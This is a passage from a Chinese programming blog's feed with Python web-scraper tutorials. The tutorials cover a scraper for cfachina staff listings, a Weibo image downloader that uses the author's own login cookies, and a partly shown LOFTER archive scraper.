&#123;&#39;class&#39;:&#39;gst_title&#39;&#125;).find_all(&#39;a&#39;)[2].get_text()            print(&#39;\nGrab Thread: get %s - %s with %s pages\n&#39; % (mechanism_id, mechanism_name, page_cnt))            # put data into html_queue            self.html_queue.put(&#123;&#39;name&#39;:&#39;%s_%s&#39; % (mechanism_id, mechanism_name), &#39;num&#39;:1, &#39;content&#39;:html&#125;)            for i in range(2, int(page_cnt) + 1):                url = self.__get_url(mechanism_id, i)                html = self.grab(url)                self.html_queue.put(&#123;&#39;name&#39;:&#39;%s_%s&#39; % (mechanism_id, mechanism_name), &#39;num&#39;:i, &#39;content&#39;:html&#125;)            self.url_queue.task_done()class DatamineThread(Thread):    &quot;&quot;&quot;Parse data from html&quot;&quot;&quot;    def __init__(self, html_queue, filetype):        Thread.__init__(self)        self.html_queue = html_queue        self.filetype = filetype    def __datamine(self, data):        &#39;&#39;&#39;Get data from html content&#39;&#39;&#39;        soup = BeautifulSoup(data[&#39;content&#39;].text, &#39;html.parser&#39;)        infos = []        for info in soup.find_all(&#39;tr&#39;, id=True):            items = []            for item in info.find_all(&#39;td&#39;):                items.append(item.get_text())            infos.append(items)        return infos    def run(self):        while True:            data = self.html_queue.get()            print(&#39;Datamine Thread: get %s_%d&#39; % (data[&#39;name&#39;], data[&#39;num&#39;]))            store = Storage(data[&#39;name&#39;], self.filetype)            store.save(self.__datamine(data))            self.html_queue.task_done()class Storage():    def __init__(self, filename, filetype):        self.filetype = filetype        self.filename = filename + filetype        self.table_header = (&#39;姓名&#39;, &#39;性别&#39;, &#39;从业资格号&#39;, &#39;投资咨询从业证书号&#39;, &#39;任职部门&#39;, &#39;职务&#39;, &#39;任现职时间&#39;)        self.path = self.__get_path()    def __get_path(self):        path = &#123;            &#39;Windows&#39;: &#39;D:/litreily/Documents/python/cfachina&#39;,            &#39;Linux&#39;: &#39;/mnt/d/litreily/Documents/python/cfachina&#39;        &#125;.get(platform.system())        if not os.path.isdir(path):            os.makedirs(path)        return &#39;%s/%s&#39; % (path, self.filename)    def write_txt(self, data):        &#39;&#39;&#39;Write data to txt file&#39;&#39;&#39;        fid = open(self.path, &#39;a&#39;, encoding=&#39;utf-8&#39;)        # insert the header of table        if not os.path.getsize(self.path):            fid.write(&#39;\t&#39;.join(self.table_header) + &#39;\n&#39;)        for info in data:            fid.write(&#39;\t&#39;.join(info) + &#39;\n&#39;)        fid.close()    def write_excel(self, data):        &#39;&#39;&#39;write data to excel file&#39;&#39;&#39;        if not os.path.exists(self.path):            header_style = xlwt.easyxf(&#39;font:name 楷体, color-index black, bold on&#39;)            wb = xlwt.Workbook(encoding=&#39;utf-8&#39;)            ws = wb.add_sheet(&#39;Data&#39;)            # insert the header of table            for i in range(len(self.table_header)):                ws.write(0, i, self.table_header[i], header_style)        else:            rb = open_workbook(self.path)            wb = copy(rb)            ws = wb.get_sheet(0)        # write data        offset = len(ws.rows)        for i in range(0, len(data)):            for j in range(0, len(data[0])):                ws.write(offset + i, j, data[i][j])        # When use xlutils.copy.copy function to copy data from exist .xls file,        # it will loss the origin style, so we need overwrite the width of column,        # maybe there some other good solution, but I have not found yet.        for i in range(len(self.table_header)):            ws.col(i).width = 256 * (10, 10, 15, 20, 50, 20, 15)[i]        # save to file        while True:            try:                wb.save(self.path)                break            except PermissionError as e:                print(&#39;&#123;0&#125; error: &#123;1&#125;&#39;.format(self.path, e.strerror))                time.sleep(5)            finally:                pass    def save(self, data):        &#39;&#39;&#39;Write data to local file.        According filetype to choose function to save data, filetype can be &#39;.txt&#39;        or &#39;.xls&#39;, but &#39;.txt&#39; type is saved more faster then &#39;.xls&#39; type        Args:            data: a 2d-list array that need be save        &#39;&#39;&#39;        &#123;            &#39;.txt&#39;: self.write_txt,            &#39;.xls&#39;: self.write_excel        &#125;.get(self.filetype)(data)def main():    for i in range(1001, 1199):        url_queue.put(str(i))    # create and start a spider thread    st = SpiderThread(url_queue, html_queue)    st.setDaemon(True)    st.start()    # create and start a datamine thread    dt = DatamineThread(html_queue, &#39;.xls&#39;)    dt.setDaemon(True)    dt.start()    # wait on the queue until everything has been processed    url_queue.join()    html_queue.join()if __name__ == &#39;__main__&#39;:    main()</code></pre><h2 id="爬取测试"><a href="#爬取测试" class="headerlink" title="爬取测试"></a>爬取测试</h2><p><img src="/assets/spider/cfachina/spider.png" alt="spider"></p><p><img src="/assets/spider/cfachina/save_txt.png" alt="save to txt"></p><p><img src="/assets/spider/cfachina/save_xls.png" alt="save to excel"></p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><ul><li>测试发现，写入<code>txt</code>的速度明显高于写入<code>excel</code>的速度</li><li>如果将页面网址中的<code>pageSize</code>修改为<code>1000</code>或更大，则可以一次性获取某机构的所有从业人员信息，而不用逐页爬取，效率可以大大提高。</li><li>该爬虫已托管至<a href="https://github.com/Litreily/Python-demos">github Python-demos</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spider </tag>
            
            <tag> queue </tag>
            
            <tag> xlwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫2 - 爬取新浪微博用户图片</title>
      <link href="2018/04/10/sina/"/>
      <url>2018/04/10/sina/</url>
      
        <content type="html"><![CDATA[<p>其实，新浪微博用户图片爬虫是我学习<code>python</code>以来写的第一个爬虫，只不过当时懒，后来爬完<code>Lofter</code>后觉得有必要总结一下，所以就有了第一篇爬虫博客。现在暂时闲下来了，准备把新浪的这个也补上。</p><p>言归正传，既然选择爬新浪微博，那当然是有需求的，这也是学习的主要动力之一，没错，就是美图。<code>sina</code>用户多数微博都是包含图片的，而且是组图居多，单个图片的较少。</p><p>为了避免侵权，本文以本人微博<a href="https://weibo.com/litreily">litreily</a>为例说明整个爬取过程，虽然图片较少，质量较低，但爬取方案是绝对ok的，使用时只要换个用户ID就可以了。</p><h2 id="分析sina站点"><a href="#分析sina站点" class="headerlink" title="分析sina站点"></a>分析sina站点</h2><h3 id="获取用户ID"><a href="#获取用户ID" class="headerlink" title="获取用户ID"></a>获取用户ID</h3><p>在爬取前，我们需要知道的是每个用户都有一个用户名，而一个用户名又对应一个唯一的整型数字ID，类似于学生的学号，本人的是<code>2657006573</code>。至于怎么根据用户名去获取ID，有以下两种方法：</p><ol><li>进入待爬取用户主页，在浏览器网址栏中即可看到一串数据，那就是用户ID</li><li><code>Ctrl-U</code>查看待爬取用户的源码，搜索<code>&quot;uid</code>，注意是<strong>双引号</strong></li></ol><p>其实是可以在已知用户名的情况下通过爬虫自动获取到<code>uid</code>的，但是我当时初学<code>python</code>，并没有考虑充分，所以后面的源码是以用户ID作为输入参数的。</p><h3 id="图片存储参数解析"><a href="#图片存储参数解析" class="headerlink" title="图片存储参数解析"></a>图片存储参数解析</h3><p>用户所有的图片都被存放至这样的路径下，真的是<strong>所有图片</strong>哦！！！</p><pre><code class="yml">https://weibo.cn/&#123;uid&#125;/profile?filter=&#123;filter_type&#125;&amp;page=&#123;page_num&#125;# examplehttps://weibo.cn/2657006573/profile?filter=0&amp;page=1uid: 2657006573filter_type: 0page_num: 1</code></pre><p>注意，是<code>weibo.cn</code>而不是<code>weibo.com</code>，至于我是怎么找到这个页面的，说实话，我也忘了。。。</p><p>链接中包含3个参数，<code>uid</code>, <code>filter_mode</code> 以及 <code>page_num</code>。其中，<code>uid</code>就是前面提及的用户ID，<code>page_num</code>也很好理解，就是分页的当前页数，从1开始增加，那么，这个<code>filter_mode</code>是什么呢？</p><p>不着急，我们先来看看页面↓</p><p><img src="/assets/spider/sina/filter_mode.png" alt="filter mode of pictures"></p><p>可以看到，滤波类型<code>filter_mode</code>指的就是筛选条件，一共三个：</p><ol><li>filter=0 全部微博（包含纯文本微博，转载微博）</li><li>filter=1 原创微博（包含纯文本微博）</li><li>filter=2 图片微博（必须含有图片，包含转载）</li></ol><p>我通常会选择<strong>原创</strong>，因为我并不希望爬取结果中包含转载微博中的图片。当然，大家依照自己的需要选择即可。</p><h3 id="图链解析"><a href="#图链解析" class="headerlink" title="图链解析"></a>图链解析</h3><p>好了，参数来源都知道了，我们回过头看看这个网页。页面是不是感觉就是个空架子？毫无css痕迹，没关系，新浪本来就没打算把这个页面主动呈现给用户。但对于爬虫而言，这却是极好的，为什么这么说？原因如下：</p><ol><li>图片齐全，没有遗漏，就是个可视化的数据库</li><li>样式少，页面简单，省流量，爬取快</li><li>静态网页，分页存储，所见即所得</li><li>源码包含了所有微博的<strong>首图</strong>和<strong>组图链接</strong></li></ol><p>这样的网页用来练手再合适不过。但要注意的是上面第4点，什么是<strong>首图</strong>和<strong>组图链接</strong>呢，很好理解。每篇博客可能包含多张图片，那就是<strong>组图</strong>，但该页面只显示博客的第一张图片，即所谓的<strong>首图</strong>，<strong>组图链接</strong>指向的是存储着该组图所有图片的网址。</p><p>由于本人微博没组图，所以此处以刘亦菲微博为例，说明单图及组图的图链格式</p><p><img src="/assets/spider/sina/pictures.png" alt="pictures"></p><p>图中的上面一篇微博只有一张图片，可以轻易获取到原图链接，注意是<strong>原图</strong>，因为我们在页面能看到的是缩略图，但要爬取的当然是<strong>原图</strong>啦。</p><p>图中下面的微博包含组图，在图片右侧的<code>Chrome</code>开发工具可以看到组图链接。</p><p><a href="https://weibo.cn/mblog/picAll/FCQefgeAr?rl=2">https://weibo.cn/mblog/picAll/FCQefgeAr?rl=2</a></p><p>打开组图链接，可以看到图片如下图所示：</p><p><img src="/assets/spider/sina/picture_url.png" alt="picture&#39;s url"></p><p>可以看到缩略图链接以及原图链接，然后我们点击<strong>原图</strong>看一下。</p><p><img src="/assets/spider/sina/picture_source.png" alt="picture&#39;s origin url"></p><p>可以发现，弹出页面的链接与上图显示的不同，但与上图中的缩略图链接极为相似。它们分别是：</p><ol><li>缩略图：<a href="http://ww1.sinaimg.cn/thumb180/c260f7ably1fn4vd7ix0qj20rs1aj1kx.jpg">http://ww1.sinaimg.cn/thumb180/c260f7ably1fn4vd7ix0qj20rs1aj1kx.jpg</a></li><li>原图：<a href="http://wx1.sinaimg.cn/large/c260f7ably1fn4vd7ix0qj20rs1aj1kx.jpg">http://wx1.sinaimg.cn/large/c260f7ably1fn4vd7ix0qj20rs1aj1kx.jpg</a></li></ol><p>可以看出，只是一个<code>thumb180</code>和<code>large</code>的区别。既然发现了规律，那就好办多了，我们只要知道缩略图的网址，就可以将域名后的第一级子域名替换成<code>large</code>就可以了，而不用获取<strong>原图</strong>链接再跳转一次。</p><p>而且，多次尝试可以发现组图链接及缩略图链接满足正则表达式：</p><pre><code class="python"># 1. 组图链接：imglist_reg = r&#39;href=&quot;(https://weibo.cn/mblog/picAll/.&#123;9&#125;\?rl=2)&quot;&#39;# 2. 缩略图img_reg = r&#39;src=&quot;(http://w.&#123;2&#125;\.sinaimg.cn/(.&#123;6,8&#125;)/.&#123;32,33&#125;.(jpg|gif))&quot;&#39;</code></pre><p>到此，新浪微博的解析过程就结束了，图链的格式以及获取方式也都清楚了。下面就可以设计方案进行爬取了。</p><h2 id="确定爬取方案"><a href="#确定爬取方案" class="headerlink" title="确定爬取方案"></a>确定爬取方案</h2><p>根据解析结果，很容易制定出以下爬取方案：</p><ol><li>给定微博用户名<code>litreily</code></li><li>进入待爬取用户主页，即可从网址中获取<code>uid: 2657006573</code></li><li>获取本人登录微博后的<code>cookies</code>（请求报文需要用到<code>cookies</code>）</li><li>逐一爬取<a href="https://weibo.cn/2657006573/profile?filter=0&amp;page=%7B1,2,3,...%7D">https://weibo.cn/2657006573/profile?filter=0&amp;page={1,2,3,...}</a></li><li>解析每一页的源码，获取单图链接及组图链接，<ul><li>单图：直接获取该图缩略图链接；</li><li>组图：爬取组图链接，循环获取组图页面所有图片的缩略图链接</li></ul></li><li>循环将第5步获取到的图链替换为原图链接，并下载至本地</li><li>重复第4-6步，直至没有图片</li></ol><h3 id="获取cookies"><a href="#获取cookies" class="headerlink" title="获取cookies"></a>获取cookies</h3><p>针对以上方案，其中有几个重点内容，其一就是<code>cookies</code>的获取，我暂时还没学怎么自动获取<code>cookies</code>，所以目前是登录微博后手动获取的。</p><p><img src="/assets/spider/sina/cookies.png" alt="get cookies"></p><h3 id="下载网页"><a href="#下载网页" class="headerlink" title="下载网页"></a>下载网页</h3><p>下载网页用的是<code>python3</code>自带的<code>urllib</code>库，当时没学<code>requests</code>，以后可能也很少用<code>urllib</code>了。</p><pre><code class="python">def _get_html(url, headers):    try:        req = urllib.request.Request(url, headers = headers)        page = urllib.request.urlopen(req)        html = page.read().decode(&#39;UTF-8&#39;)    except Exception as e:        print(&quot;get %s failed&quot; % url)        return None    return html</code></pre><h3 id="获取存储路径"><a href="#获取存储路径" class="headerlink" title="获取存储路径"></a>获取存储路径</h3><p>由于我是在<code>win10</code>下编写的代码，但是个人比较喜欢用<code>bash</code>，所以图片的存储路径有以下两种格式，<code>_get_path</code>函数会自动判断当前操作系统的类型，然后选择相应的路径。</p><pre><code class="python">def _get_path(uid):    path = &#123;        &#39;Windows&#39;: &#39;D:/litreily/Pictures/python/sina/&#39; + uid,        &#39;Linux&#39;: &#39;/mnt/d/litreily/Pictures/python/sina/&#39; + uid    &#125;.get(platform.system())    if not os.path.isdir(path):        os.makedirs(path)    return path</code></pre><p>幸好<code>windows</code>是兼容<code>linux</code>系统的斜杠符号的，不然程序中的相对路径替换还挺麻烦。</p><h3 id="下载图片"><a href="#下载图片" class="headerlink" title="下载图片"></a>下载图片</h3><p>由于选用的<code>urllib</code>库，所以下载图片就使用<code>urllib.request.urlretrieve</code>了</p><pre><code class="python"># image url of one page is saved in imgurlsfor img in imgurls:    imgurl = img[0].replace(img[1], &#39;large&#39;)    num_imgs += 1    try:        urllib.request.urlretrieve(imgurl, &#39;&#123;&#125;/&#123;&#125;.&#123;&#125;&#39;.format(path, num_imgs, img[2]))        # display the raw url of images        print(&#39;\t%d\t%s&#39; % (num_imgs, imgurl))    except Exception as e:        print(str(e))        print(&#39;\t%d\t%s failed&#39; % (num_imgs, imgurl))</code></pre><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>其它细节详见源码</p><pre><code class="python">#!/usr/bin/python3# -*- coding:utf-8 -*-# author: litreily# date: 2018.02.05&quot;&quot;&quot;Capture pictures from sina-weibo with user_id.&quot;&quot;&quot;import reimport osimport platformimport urllibimport urllib.requestfrom bs4 import BeautifulSoupdef _get_path(uid):    path = &#123;        &#39;Windows&#39;: &#39;D:/litreily/Pictures/python/sina/&#39; + uid,        &#39;Linux&#39;: &#39;/mnt/d/litreily/Pictures/python/sina/&#39; + uid    &#125;.get(platform.system())    if not os.path.isdir(path):        os.makedirs(path)    return pathdef _get_html(url, headers):    try:        req = urllib.request.Request(url, headers = headers)        page = urllib.request.urlopen(req)        html = page.read().decode(&#39;UTF-8&#39;)    except Exception as e:        print(&quot;get %s failed&quot; % url)        return None    return htmldef _capture_images(uid, headers, path):    filter_mode = 1      # 0-all 1-original 2-pictures    num_pages = 1    num_blogs = 0    num_imgs = 0    # regular expression of imgList and img    imglist_reg = r&#39;href=&quot;(https://weibo.cn/mblog/picAll/.&#123;9&#125;\?rl=2)&quot;&#39;    imglist_pattern = re.compile(imglist_reg)    img_reg = r&#39;src=&quot;(http://w.&#123;2&#125;\.sinaimg.cn/(.&#123;6,8&#125;)/.&#123;32,33&#125;.(jpg|gif))&quot;&#39;    img_pattern = re.compile(img_reg)    print(&#39;start capture picture of uid:&#39; + uid)    while True:        url = &#39;https://weibo.cn/%s/profile?filter=%s&amp;page=%d&#39; % (uid, filter_mode, num_pages)        # 1. get html of each page url        html = _get_html(url, headers)        # 2. parse the html and find all the imgList Url of each page        soup = BeautifulSoup(html, &quot;lxml&quot;)        # &lt;div class=&quot;c&quot; id=&quot;M_G4gb5pY8t&quot;&gt;&lt;div&gt;        blogs = soup.body.find_all(attrs=&#123;&#39;id&#39;:re.compile(r&#39;^M_&#39;)&#125;, recursive=False)        num_blogs += len(blogs)        imgurls = []        for blog in blogs:            blog = str(blog)            imglist_url = imglist_pattern.findall(blog)            if not imglist_url:                # 2.1 get img-url from blog that have only one pic                imgurls += img_pattern.findall(blog)            else:                # 2.2 get img-urls from blog that have group pics                html = _get_html(imglist_url[0], headers)                imgurls += img_pattern.findall(html)        if not imgurls:            print(&#39;capture complete!&#39;)            print(&#39;captured pages:%d, blogs:%d, imgs:%d&#39; % (num_pages, num_blogs, num_imgs))            print(&#39;directory:&#39; + path)            break        # 3. download all the imgs from each imgList        print(&#39;PAGE %d with %d images&#39; % (num_pages, len(imgurls)))        for img in imgurls:            imgurl = img[0].replace(img[1], &#39;large&#39;)            num_imgs += 1            try:                urllib.request.urlretrieve(imgurl, &#39;&#123;&#125;/&#123;&#125;.&#123;&#125;&#39;.format(path, num_imgs, img[2]))                # display the raw url of images                print(&#39;\t%d\t%s&#39; % (num_imgs, imgurl))            except Exception as e:                print(str(e))                print(&#39;\t%d\t%s failed&#39; % (num_imgs, imgurl))        num_pages += 1        print(&#39;&#39;)def main():    # uids = [&#39;2657006573&#39;,&#39;2173752092&#39;,&#39;3261134763&#39;,&#39;2174219060&#39;]    uid = &#39;2657006573&#39;    path = _get_path(uid)    # cookie is form the above url-&gt;network-&gt;request headers    cookies = &#39;&#39;    headers = &#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&#39;,            &#39;Cookie&#39;: cookies&#125;    # capture imgs from sina    _capture_images(uid, headers, path)if __name__ == &#39;__main__&#39;:    main()</code></pre><p>使用时记得修改<code>main</code>函数中的<code>cookies</code>和<code>uid</code>！</p><h2 id="爬取测试"><a href="#爬取测试" class="headerlink" title="爬取测试"></a>爬取测试</h2><p><img src="/assets/spider/sina/capturer_litreily.png" alt="capture litreily"></p><p><img src="/assets/spider/sina/capturer_litreily_end.png" alt="capture litreily end"></p><p><img src="/assets/spider/sina/captured_pictures.png" alt="captured pictures"></p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><ul><li>该爬虫已存放至开源项目<a href="https://github.com/Litreily/capturer">capturer</a>，欢迎交流</li><li>由于是首个爬虫，所以许多地方有待改进，相对的<a href="http://www.litreily.top/2018/03/17/lofter/">LOFTER爬虫</a>就更娴熟写了</li><li>目前没有发现新浪微博有明显的反爬措施，但还是按需索取为好</li></ul>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
            <tag> spider </tag>
            
            <tag> sina </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫1 - 爬取网易LOFTER图片</title>
      <link href="2018/03/17/lofter/"/>
      <url>2018/03/17/lofter/</url>
      
        <content type="html"><![CDATA[<p><code>LOFTER</code>是网易出品的优质轻博客，灵感源于国外的<code>tumblr</code>，但比之更加文艺，更加本地化。本人非常喜欢<code>LOFTER</code>的UI设计，以及其中的优质用户和内容，似乎网易并不擅长推广，所以受众并不广泛。这都是题外话，本文主要记录作者近期学习<code>python3</code>并用之爬取<code>LOFTER</code>用户图片的过程和成果，与大家交流分享。</p><blockquote><p>本文将以本人<a href="http://litreily.lofter.com/">litreily</a>博客为例说明整个爬取过程</p></blockquote><h2 id="分析LOFTER站点"><a href="#分析LOFTER站点" class="headerlink" title="分析LOFTER站点"></a>分析LOFTER站点</h2><p>在爬取站点之前，首先需要分析站点的关键信息有哪些，如果给自己提问，可能会有以下问题：</p><ol><li>用户的主页网址格式是？</li><li>用户博客链接的格式是？</li><li>每篇博客内的图片链接的格式是？</li><li>不同用户的主页模板不同，是否可以按同样方法抓取博客信息？</li><li>用户的博客数量巨大，主页以什么方式分页？</li><li>有没有归档页面方便爬取（大多数网站都有归档页面）？</li></ol><p>当然，这些问题不是一下子就能想出来，可以在探索网页内容的过程逐步展开，并思考下一步该考虑的问题，下面针对各个问题对主页进行探索分析。</p><h3 id="主页信息"><a href="#主页信息" class="headerlink" title="主页信息"></a>主页信息</h3><blockquote><p>主页: <code>http://[username].lofter.com</code></p></blockquote><p><img src="/assets/spider/lofter/litreily.png" alt="litreily"></p><p>从主页可以看到<a href="http://litreily.lofter.com/view">归档</a>的链接，暂时不管。不同的用户，其主页所用模板不尽一致，<code>LOFTER</code>为提供了大量精美的主页模板，以满足不同用户的需求：</p><p><img src="/assets/spider/lofter/lofterTemplet.png" alt="lofter templet"></p><p>然而，正是因为所用模板不同，其网页内容格式也不同，这个从不同模板中图片的位置，大小，图片信息等就可以看出来。相同的资源，不同的展示方式，就好像同样一件艺术品，既可以摆放在玻璃框中，也可以悬挂在高空。</p><p>当然这不是本文重点，这里只是为了说明不同用户的主页信息展示不一样，会给爬虫爬取带来一定影响。</p><h3 id="分页信息"><a href="#分页信息" class="headerlink" title="分页信息"></a>分页信息</h3><p>点击主页尾部的下一页，可以跳转至下一页，除首页和末页外，都会有上一页和下一页的链接，这里就给了我们一个提示，我们可以先抓取首页信息，然后从中抓取到<strong>下一页</strong>的链接，然后不断获取<strong>下一页</strong>的博客信息。</p><p><img src="/assets/spider/lofter/pages.png" alt="pages"></p><p>或者更简单点，看网址栏中的网址格式:</p><blockquote><p>分页： <code>http://[username].lofter.com/?page=[pageNumber]&amp;t=[timeStamp]</code></p></blockquote><p>直接使用<code>for</code>循环修改<code>page</code>值，逐页爬取博客信息。这貌似是个不错的想法，好，假设这样可行，那我们来分析每一页的信息。</p><p><img src="/assets/spider/lofter/postLink.png" alt="post link"></p><p>如上图所示，首先找到博文永久链接<code>http://litreily.lofter.com/post/44fbca_1265bb3e</code></p><p>针对含有图片的某一篇博文，<strong>litreily</strong>所用模板中会出现两次博文链接（见图中红框标注的两处），倘若我们使用正则表达式:</p><pre><code class="python">re.findall(r&#39;&quot;http://.*lofter.com/post/[\w_]*&quot;&#39;, html)</code></pre><p>将对每篇博文匹配出两个一样的链接，这可不是我们想要的，那咋整，匹配完再把重复的删了？不至于这么麻烦，细看两处链接前后信息，可以看到两处链接的<code>class</code>属性不一致，好办了，咱改改正则：</p><pre><code class="python">re.findall(r&#39;&lt;a class=&quot;img&quot; href=&quot;(http://.*lofter.com/post/[\w_]*)&quot;&gt;&#39;, html)</code></pre><p>好像可以了，这不就可以按页抓取博客链接，然后接着分析每篇博文信息不就好了么。我原本就想这么干，可是当我查看了不同用户的排版以及相应的链接信息后，整个人都不好了，一千个用户就是一千个哈姆雷特啊。如果你发现有统一解析所有用户模板信息的方法，那肯定是你看的模板不够多。</p><p>所以呢，这条路是走不通了，至少我没再往这条路上走。打道回府，只不过重头再来，路漫漫其修远兮，吾将上下而求索。</p><p>靠，说了半天，原来走不通，那你说个毛线！！！淡定淡定，都是文明人，后面的风景很远，额不是，，，是很美，请耐心等待...</p><h3 id="归档页信息"><a href="#归档页信息" class="headerlink" title="归档页信息"></a>归档页信息</h3><blockquote><p>归档页：<code>http://[username].lofter.com/view</code></p></blockquote><p>好了，还记得前面说的<strong>归档</strong>吧，归档可是个好东西，它把所有博文都按日期归档，最主要的是，所有用户的归档页面都是同一个模板，不管大V小v还是普通老百姓，真的是一视同仁。剩下的问题就是<strong>如何从归档页抓取每篇博客的真实路径</strong>。</p><p><img src="/assets/spider/lofter/archive.png" alt="archive"></p><p>先来看看归档页面的结构吧，博客按月份归档，每篇博客仅显示首张图片缩略图或纯文本。然后<code>F12</code>打开调试工具，如下图所示，每个月份对应一个<code>&lt;div class=&quot;m-filecnt m-filecnt-1&quot;&gt;</code>这样的节点，每个月份节点包含了本月所有博客的入口信息，一篇博客对应一个<code>id</code>号，以及一个博客的<strong>相对路径</strong>。<code>id</code>神马的不用关心，重点就是这个<strong>相对路径</strong>，有了它不就有了博客的绝对路径了么。</p><ul><li>相对路径：&quot;/post/44fbca_1265bb3e&quot;</li><li>绝对路径：<code>http://[username].lofter.com/post/44fbca_1265bb3e</code></li></ul><p><img src="/assets/spider/lofter/archive_html.png" alt="archive structure"></p><p>这样看来，那岂不是只要抓取这一个归档页面就可以抓到所有的博客路径了呢？呵呵，真的这么容易吗？显然不大可能，当我们下拉页面时，归档信息将动态加载刷新，没错，是动态的！！！意料之中的猝不及防</p><p>接着我在Chrome浏览器中<code>Ctrl+U</code>看了看网页的源码（太长这就不放图了），果然不出所料，动态数据在源码中是木有的，只有一个脚本在那静静的躺着，躺着，躺着。。。难道就要放弃了吗，当然不！<strong>只要是网络通信，就必然有请求包和响应包</strong></p><p>那现在的问题就是，动态网页的数据是如果获取到的？动态数据的<strong>真实请求</strong>是什么？抓包看看呗，打开浏览器调试工具中的<code>Network</code>，刷新归档页，看看页面加载过程，找到真实请求，这个很好找，这类请求的后缀一般不会是png,jpg,gif,js,css等，而且多半是<strong>POST</strong>包，并且会出现在一堆图片请求的前面。</p><p><img src="/assets/spider/lofter/post.png" alt="post"></p><p>好了，找到了，就是上面这货。现在归档数据请求的链接有了，确实是<strong>POST</strong>包，同样，请求包的头部信息<code>headers</code>和请求参数<code>request payload</code>也有了。</p><p><img src="/assets/spider/lofter/post_values.png" alt="request values"></p><p>现在的关键问题是，这些请求包中的参数都是干嘛的？经我多方尝试、猜测与观察，总结如下：</p><pre><code class="C#">callCount=1       # 固定scriptSessionId=$&#123;scriptSessionId&#125;187   # 固定httpSessionId=    # 固定c0-scriptName=ArchiveBean       # 固定c0-methodName=getArchivePostByTime      # 固定c0-id=0           # 固定c0-param0=number:4520906        # 用户ID，可从用户主页源码获取c0-param1=number:1521342313224  # 时间戳，最最最关键参数！c0-param2=number:50       # 单次请求博客篇数，可以按需求修改c0-param3=boolean:false   # 固定batchId=822456            # 6位随机数，爬取时可以固定</code></pre><p>所以我们模拟请求包的时候就按这个来就可以了，至于时间戳怎么获取，请求包的<code>headers</code>如何确定，后面会有详述。</p><p>下面我们来看看请求后得到的响应包长啥样，look，就下面这个，看到没，**<code>permalink</code>**, 千呼万唤始出来啊，这不就是我们想要的博客固定路径了么。响应包并不是<code>html</code>文件，而是一组数据，我觉着归档页包含的那个脚本就是根据这个数据文件进而请求首张图片信息或文本信息的，当然这是我的猜测了，有兴趣的可以去看看那个脚本。</p><p><img src="/assets/spider/lofter/post_response.png" alt="post response"></p><p>有了这组数据，咱就可以获取每次请求得到的博客路径列表，进而逐一爬取博客内的图片链接了。</p><p>到此处为止，归档页的信息就分析完了，我们已经知道该发送怎样的请求包去获取归档数据，与此同时，我们也知道了从归档页如何获取每篇博客的真实路径。</p><p>下面就来看看当我们知道博客路径并抓取后，该如何获取每篇博客正文内的图片链接。</p><h3 id="博客页信息"><a href="#博客页信息" class="headerlink" title="博客页信息"></a>博客页信息</h3><blockquote><p>博客： <code>http://[username].lofter.com/post/******_********</code></p></blockquote><p>以上面获取的博客 <a href="http://litreily.lofter.com/post/33a459_1230cb50">http://litreily.lofter.com/post/33a459_1230cb50</a> 为例，大部分博客内的图片都不止一张，这也是必须访问博客页本身的主要原因，好了照旧查看页面元素。</p><p><img src="/assets/spider/lofter/blog_pic.png" alt="blog pictures"></p><p>可以发现每篇博客内所有图片的大图链接都是上图框选中这样的，都有着同样的属性<code>bigimgsrc</code>，并且是博客页面唯一的。由于每篇博客源码内包含了该篇博客所有的图片链接，所以当我们获取了某篇博客的<code>html</code>文件后，便可以使用正则表达式获取所有图片链接。</p><p>至此，我们已经掌握了爬取<code>lofter</code>单用户博客图片所需的所有信息，是时候确定爬取方案了。</p><h2 id="确定爬取方案"><a href="#确定爬取方案" class="headerlink" title="确定爬取方案"></a>确定爬取方案</h2><p>首先，根据给定的<code>username</code>获取<code>uid</code>作为<code>POST</code>请求包数据中的一分子；然后，循环执行以下步骤直至全部爬取完成</p><ol><li>生成或更新归档页请求数据</li><li>模拟归档页面发送POST请求</li><li>解析响应数据并获取博客链接</li><li>逐一爬取博客内容</li><li>解析博客内容并获取图片链接</li><li>逐一下载图片至本地</li></ol><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>方案确定好了，那就撸起袖子加油干吧！</p><h3 id="依赖库"><a href="#依赖库" class="headerlink" title="依赖库"></a>依赖库</h3><ul><li>requests</li></ul><p>Only one! 没错，依赖的第三方库就这一个，怎么装咱这就不说了</p><h3 id="获取用户ID"><a href="#获取用户ID" class="headerlink" title="获取用户ID"></a>获取用户ID</h3><p>用户ID，确切的说是用户博客的唯一ID，是归档页请求报文中的参数之一，通过查看主页源码找到了相应的字符串，所以只要用<code>request.get</code>抓取首页然后匹配ID字符串就可以了，代码如下：</p><pre><code class="python">def _get_blogid(username):    try:        html = requests.get(&#39;http://%s.lofter.com&#39; % username)        id_reg = r&#39;src=&quot;http://www.lofter.com/control\?blogId=(.*)&quot;&#39;        blogid = re.search(id_reg, html.text).group(1)        print(&#39;The blogid of %s is: %s&#39; % (username, blogid))        return blogid    except Exception as e:        print(&#39;get blogid from http://%s.lofter.com failed&#39; % username)        print(&#39;please check your username.&#39;)        exit(1)</code></pre><h3 id="生成POST请求数据"><a href="#生成POST请求数据" class="headerlink" 